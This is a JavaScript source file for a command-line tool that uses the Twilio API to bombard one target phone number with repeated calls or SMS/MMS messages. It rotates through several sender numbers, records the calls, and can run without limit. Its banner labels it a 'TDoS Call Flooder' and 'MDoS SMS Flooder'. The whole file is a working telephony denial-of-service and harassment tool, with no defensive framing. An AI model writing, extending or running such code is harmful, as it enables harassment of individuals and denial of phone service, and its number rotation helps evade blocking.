/*
Misanya Liui started this code
7/12/17
Ethan Wessel continuing for own personal project
10/24/2017
*/

require('dotenv').config()
const chalk = require('chalk')
const { program } = require("commander");

function commaSeparatedList(value, dummyPrevious) {
    return value.split(',');
}

program
    .requiredOption('-t, --target <string>', 'target number where messages and media will be delivered')
    .requiredOption('-a, --action <string>', 'call or sms', 'call')
    .requiredOption('-n, --numbers <items>', 'numbers to use; comma separated', commaSeparatedList)
    .option('-i, --instances <string>', 'number of call/sms instances to deliver', 'unlimited')
    .option('-d, --delay <string>', 'delay between calls/sms in seconds', '10')
    .option('-m, --message <string>', 'message to send for sms')
    .option('-l, --imageLink <string>', 'media to send for mms (link)')
    .parse()
const options = program.opts()

if (options.action !== 'call' && options.action !== 'sms') {
    console.log(chalk.red(`'${options.action}' is an Invalid Action, please select: 'call' or 'sms'`))
    process.exit(0)
}

const ACTION = options.action
const MAX_INSTANCE_COUNT = options.instances !== 'unlimited' ? parseInt(options.instances) : 'unlimited'
const DELAY = parseInt(options.delay) * 1000;
const MESSAGE = options.message;
const MEDIA = options.imageLink;
const TARGET = options.target;
const NUMBERS = options.numbers;

const ACCOUNT_SID = process.env.TWILIO_ACCOUNT_SID; //Config Here
const AUTH_TOKEN = process.env.TWILIO_AUTH_TOKEN; //Config Here
const TWIML_URL = process.env.TWILIO_TWIML; //Config Here
const MSG_SERVICE_SID = process.env.MSG_SID; //Config Here

let client = require('twilio')(ACCOUNT_SID, AUTH_TOKEN);

let instanceCount = 0;
let index = 0;

const callPhone = () => {
    if (typeof (MAX_INSTANCE_COUNT) === 'number' && instanceCount >= MAX_INSTANCE_COUNT) {
        console.log(`Terminating, max call count reached: ${MAX_INSTANCE_COUNT}`)
        process.exit(0)
    }
    instanceCount += 1
    client.calls.create({
        url: TWIML_URL,
        to: TARGET,
        from: NUMBERS[index++],
        record: true
    }, function (err, call) {
        if (call) {
            console.log(`SID: ${call.sid}`);
            console.log(`Calling ${chalk.yellow(TARGET)} from ${chalk.yellow(NUMBERS[index])}`);
        } else {
            console.log(`ERROR: ${err}`);
        }
    });
    // loop through numbers
    index += 1
    index %= NUMBERS.length
}
const smsPhone = () => {
    if (typeof (MAX_INSTANCE_COUNT) === 'number' && instanceCount >= MAX_INSTANCE_COUNT) {
        console.log(`Terminating, max message count reached: ${MAX_INSTANCE_COUNT}`)
        process.exit(0)
    }

    const params = {}
    params.messagingServiceSid = MSG_SERVICE_SID
    params.to = options.target
    if (MESSAGE && MEDIA) {
        params.body = MESSAGE
        params.mediaUrl = [MEDIA]
    } else if (MESSAGE) {
        params.body = MESSAGE
    }
    else {
        params.mediaUrl = [MEDIA]
    }

    instanceCount += 1
    client.messages.create(
        params,
        function (err, message) {
            if (message) {
                console.log(`SID: ${message.sid}`);
                console.log(`Messaging ${chalk.yellow(TARGET)} from ${chalk.yellow(NUMBERS[index])}`)
                if (MESSAGE) console.log(`message: ${chalk.green(MESSAGE)}`)
                if (MEDIA) console.log(`media: ${chalk.green(MEDIA)}`)
            } else {
                console.log(`ERROR: ${err} `);
            }
        })
    // loop through numbers
    index += 1
    index %= NUMBERS.length
}

const launch = () => {
    const action = (ACTION === 'call') ? callPhone : smsPhone;
    const output = (ACTION === 'call') ? '===TDoS Call Flooder===' : '===MDoS SMS Flooder==='
    console.log(output)
    setInterval(action, DELAY);
}
launch()
